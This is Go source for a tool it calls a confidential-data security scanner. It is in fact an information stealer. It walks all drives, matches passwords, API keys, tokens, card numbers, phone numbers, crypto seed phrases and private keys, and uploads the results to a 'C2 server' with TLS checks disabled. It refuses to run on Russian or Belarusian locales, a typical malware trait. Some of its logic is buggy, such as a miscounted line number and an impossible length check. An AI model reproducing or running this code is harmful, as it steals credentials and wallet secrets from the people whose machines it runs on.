package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	PLUS     = "[+]"
	MINUS    = "[-]"
	ASTERISK = "[*]"
)

var (
	patterns = map[string]*regexp.Regexp{
		"Email":       regexp.MustCompile(`(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b`),
		"Ethereum":    regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`),
		"Пароли":      regexp.MustCompile(`(?i)(password|pwd|пароль)[\s:=]+\S+`),
		"Bitcoin":     regexp.MustCompile(`\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b`),
		"API Ключи":   regexp.MustCompile(`(?i)(api[_-]?key|secret[_-]?key)[\s:=]+\S+`),
		"Токены":      regexp.MustCompile(`(?i)(token|access[_-]?token)[\s:=]+\S+`),
		"Номера карт": regexp.MustCompile(`\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b`),
		"Телефоны":    regexp.MustCompile(`(?i)\b(\+7|8|7)?[\s-]?\(?[489][0-9]{2}\)?[\s-]?[0-9]{3}[\s-]?[0-9]{2}[\s-]?[0-9]{2}\b`),
		"Seed 12":     regexp.MustCompile(`(?i)\b([a-z]+(\s+[a-z]+){11})\b`),
		"Seed 24":     regexp.MustCompile(`(?i)\b([a-z]+(\s+[a-z]+){23})\b`),
		"PrivateKey":  regexp.MustCompile(`\b[a-fA-F0-9]{64}\b`),
		"CVV":         regexp.MustCompile(`\b\d{3}\b`),
	}

	bip39Words = []string{"abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"}
)

type ScanResult struct {
	Pattern string
	Path    string
	LineNum int
	Content string
}

func showBanner() {
	fmt.Println(`
   █████████  ███████████   ██████████ █████ █████ █████          ███████      █████████  █████   ████
  ███░░░░░███░░███░░░░░███ ░░███░░░░░█░░███ ░░███ ░░███         ███░░░░░███   ███░░░░░███░░███   ███░ 
 ███     ░░░  ░███    ░███  ░███  █ ░  ░░███ ███   ░███        ███     ░░███ ███     ░░░  ░███  ███   
░███          ░██████████   ░██████     ░░█████    ░███       ░███      ░███░███          ░███████    
░███    █████ ░███░░░░░███  ░███░░█      ░░███     ░███       ░███      ░███░███          ░███░░███   
░░███  ░░███  ░███    ░███  ░███ ░   █    ░███     ░███      █░░███     ███ ░░███     ███ ░███ ░░███  
 ░░█████████  █████   █████ ██████████    █████    ███████████ ░░░███████░   ░░█████████  █████ ░░████
  ░░░░░░░░░  ░░░░░   ░░░░░ ░░░░░░░░░░    ░░░░░    ░░░░░░░░░░░    ░░░░░░░      ░░░░░░░░░  ░░░░░   ░░░░ 

  Сканер безопасности информационных систем для поиска конфидециальных данных
  `)
}

func showHelp() {
	fmt.Println("\nИспользование: ./scan.exe [опции]")
	fmt.Println("Опции:")
	fmt.Println("  -path    Путь для сканирования (по умолчанию: текущую директорию)")
	fmt.Println("  -output  Файл для сохранения результатов (опционально)")
	fmt.Println("  -workers Количество потоков (по умолчанию: 5)")
	fmt.Println("  -ext     Расширения файлов для сканирования через запятую (по умолчанию: .txt)")
	fmt.Println("  -help    Показать эту справку")
	fmt.Println()
	fmt.Println("Примеры:")
	fmt.Println("  ./scan.exe -path /home/user -output results.txt")
	fmt.Println("  ./scan.exe -path C:\\Documents -workers 10 -ext .txt,.log,.csv")
	fmt.Println()
}

func getRootPaths() []string {
	switch runtime.GOOS {
	case "windows":
		drivers := make([]string, 0)
		for drive := 'A'; drive <= 'Z'; drive++ {
			driverPath := string(drive) + ":\\"
			if _, err := os.Stat(driverPath); err == nil {
				drivers = append(drivers, driverPath)
			}
		}
		return drivers
	case "linux", "darwin":
		return []string{"/"}
	default:
		return []string{"/"}
	}
}

func getSystemLocale() uint16 {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getUserDefaultLCID := kernel32.NewProc("GetUserDefaultLCID")

	lcid, _, _ := getUserDefaultLCID.Call()
	return uint16(lcid & 0xFFFF)
}

func isRestrictedRegion() bool {
	locale := getSystemLocale()

	restrictedLocales := map[uint16]bool{
		0x419: true,
		0x423: true,
	}

	return restrictedLocales[locale]
}

func processFile(path string, results chan<- ScanResult, wg *sync.WaitGroup) {
	defer wg.Done()

	file, err := os.Open(path)
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	lineNum := 1
	for scanner.Scan() {
		line := scanner.Text()
		for name, pattern := range patterns {
			matches := pattern.FindAllString(line, -1)
			for _, match := range matches {
				if isValidPattern(name, match) {
					results <- ScanResult{
						Pattern: name,
						Path:    path,
						LineNum: lineNum,
						Content: strings.TrimSpace(match),
					}
				}
			}
			lineNum++
		}
	}
}

func isValidSeedPhrase(phrase string) bool {
	words := strings.Fields(phrase)

	if len(words) != 12 && len(words) != 24 {
		return false
	}

	validCount := 0
	for _, word := range words {
		for _, bipWord := range bip39Words {
			if strings.EqualFold(word, bipWord) {
				validCount++
				break
			}
		}
	}

	return validCount >= len(words)-2
}

func isValidPattern(patterName, match string) bool {
	switch patterName {
	case "Телефоны":
		if strings.HasPrefix(match, "0x") {
			return false
		}

		if len(match) < 10 && len(match) > 15 {
			return false
		}
	case "Ethereum":
		if len(match) != 42 {
			return false
		}
	case "Bitcoin":
		if len(match) < 26 || len(match) > 39 {
			return false
		}
	case "Seed 12", "Seed 24":
		return isValidSeedPhrase(match)
	case "PrivateKey":
		if len(match) != 64 {
			return false
		}
	case "CVE":
		if len(match) > 3 {
			return false
		}
	}
	return true
}

func scanDirectory(path string, extensions []string, workers int, results chan<- ScanResult) {
	var wg sync.WaitGroup
	files := make(chan string, 1000)

	for i := 0; i < workers; i++ {
		go func() {
			for file := range files {
				wg.Add(1)
				processFile(file, results, &wg)
			}
		}()
	}

	countFiles := func(root string) int {
		count := 0
		filepath.Walk(root, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if info.Mode().IsRegular() {
				ext := filepath.Ext(filePath)
				for _, allowedExt := range extensions {
					if ext == allowedExt {
						count++
						break
					}
				}
			}
			return nil
		})
		return count
	}

	totalFiles := 0
	if path == "./" {
		roots := getRootPaths()
		for _, root := range roots {
			totalFiles += countFiles(root)
		}
	} else {
		totalFiles = countFiles(path)
	}

	fmt.Printf("%s Найдено файлов для сканирования: %d\n", PLUS, totalFiles)
	fmt.Printf("%s Запуск сканирования с %d потоками...\n", PLUS, workers)

	walkAndSendFiles := func(root string) {
		filepath.Walk(root, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if info.Mode().IsRegular() {
				ext := filepath.Ext(filePath)
				for _, allowedExt := range extensions {
					if ext == allowedExt {
						files <- filePath
						break
					}
				}
			}
			return nil
		})
	}

	if path == "./" {
		roots := getRootPaths()
		for _, root := range roots {
			walkAndSendFiles(root)
		}
	} else {
		walkAndSendFiles(path)
	}

	close(files)
	wg.Wait()
	close(results)
}

func sendResultsToC2(filename, c2Server, authToken string) error {
	fileInfo, err := os.Stat(filename)
	if err != nil {
		return fmt.Errorf("ошибка получения информации о файле: %v", err)
	}
	fmt.Printf("%s Размер файла для отправки: %d байт\n", PLUS, fileInfo.Size())

	file, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("ошибка открытия файла: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("results", filepath.Base(filename))
	if err != nil {
		return fmt.Errorf("ошибка создания формы: %v", err)
	}

	n, err := io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("ошибка копирования файла: %v", err)
	}
	fmt.Printf("%s Фактически скопировано: %d байт\n", PLUS, n)

	if err := writer.Close(); err != nil {
		return fmt.Errorf("ошибка закрытия multipart: %v", err)
	}

	req, err := http.NewRequest("POST", c2Server+"/upload", body)
	if err != nil {
		return fmt.Errorf("ошибка создания запроса: %v", err)
	}

	req.Header.Set("Authorization", "Bearer "+authToken)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("ошибка отправки: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("сервер вернул ошибку: %s", resp.Status)
	}

	fmt.Printf("%s Результаты отправлены на C2 сервер\n", PLUS)
	return nil
}

func main() {
	showBanner()

	pathPtr := flag.String("path", ".", "Путь для сканирования")
	outputPtr := flag.String("output", "result.txt", "Файл для сохранения результатов")
	workersPtr := flag.Int("workers", 20, "Количество потоков")
	extPtr := flag.String("ext", ".txt", "Расширения файлов через запятую")
	helpPtr := flag.Bool("help", false, "Показать справку")

	flag.Parse()

	if *helpPtr {
		showHelp()
		return
	}

	if isRestrictedRegion() {
		fmt.Printf("%s Приложение не может быть запущено в ограниченном регионе.\n", MINUS)
		os.Exit(1)
	}

	var extensions []string
	if *extPtr != "" {
		extList := strings.Split(*extPtr, ",")
		for _, ext := range extList {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extensions = append(extensions, ext)
			}
		}
	}

	if len(extensions) == 0 {
		extensions = []string{".txt"}
	}

	var outputFile *os.File
	var err error

	fileoutput, err := os.Create(*outputPtr)
	if err != nil {
		fmt.Printf("%s Ошибка создания файла: %v\n", MINUS, err)
		return
	}
	defer fileoutput.Close()
	fmt.Printf("%s Результаты будут сохранены в: %s\n", PLUS, *outputPtr)
	if *outputPtr != "" {
		outputFile, err = os.Create(*outputPtr)
		if err != nil {
			fmt.Printf("%s Ошибка создания файла: %v\n", MINUS, err)
			return
		}
		defer outputFile.Close()
		fmt.Printf("%s Результаты будут сохранены в: %s\n", PLUS, *outputPtr)
	}

	if _, err = os.Stat(*pathPtr); os.IsNotExist(err) {
		fmt.Printf("%s Ошибка: путь '%s' не существует\n", MINUS, *pathPtr)
		return
	}

	fmt.Printf("%s Сканируем: %s\n", PLUS, *pathPtr)
	fmt.Printf("%s Расширения файлов: %s\n", PLUS, strings.Join(extensions, ", "))
	fmt.Printf("%s Потоков: %d\n", PLUS, *workersPtr)
	fmt.Println()

	startTime := time.Now()
	results := make(chan ScanResult, 100)

	go scanDirectory(*pathPtr, extensions, *workersPtr, results)

	var resultCount int
	for result := range results {
		resultCount++
		resultText := fmt.Sprintf("[%s] %s (строка %d): %s\n",
			result.Pattern, result.Path, result.LineNum, result.Content)
		fmt.Print(resultText)

		if outputFile != nil {
			outputFile.WriteString(resultText)
		}
	}
	elapsed := time.Since(startTime)
	fmt.Println()
	fmt.Printf("%s Сканирование завершено за %v\n", PLUS, elapsed)
	fmt.Printf("%s Найдено совпадений: %d\n", PLUS, resultCount)

	c2Server := "http://localhost:8080" //TODO: Add C2 server here
	authToken := "secret_token_123"
	if err := sendResultsToC2(*outputPtr, c2Server, authToken); err != nil {
		fmt.Printf("%s Ошибка отправки результатов: %v\n", MINUS, err)
		return
	} else {
		fmt.Printf("%s Результаты отправлены на C2 сервер\n", PLUS)
	}

	if outputFile != nil {
		fmt.Printf("%s Результаты сохранены в: %s\n", PLUS, *outputPtr)
	}

	fmt.Printf("%s Готово!\n", PLUS)
}
